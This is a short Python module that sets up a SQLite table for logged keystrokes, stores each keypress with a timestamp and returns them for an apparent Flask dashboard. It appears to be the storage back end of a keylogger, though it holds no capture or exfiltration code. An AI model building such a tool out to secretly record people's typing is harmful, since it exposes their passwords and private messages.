import sqlite3
from datetime import datetime

DB_NAME = "logs.db"

def init_db():
    """Creates the database and table if they do not exist."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            key_pressed TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_key(key_str):
    """Saves a single keypress into the database."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO keystrokes (timestamp, key_pressed) VALUES (?, ?)", (now, key_str))
    conn.commit()
    conn.close()

def get_all_keys():
    """Retrieves all logged keys to display on the Flask web dashboard."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT timestamp, key_pressed FROM keystrokes ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

# Initialize the database immediately when this script is referenced
init_db()
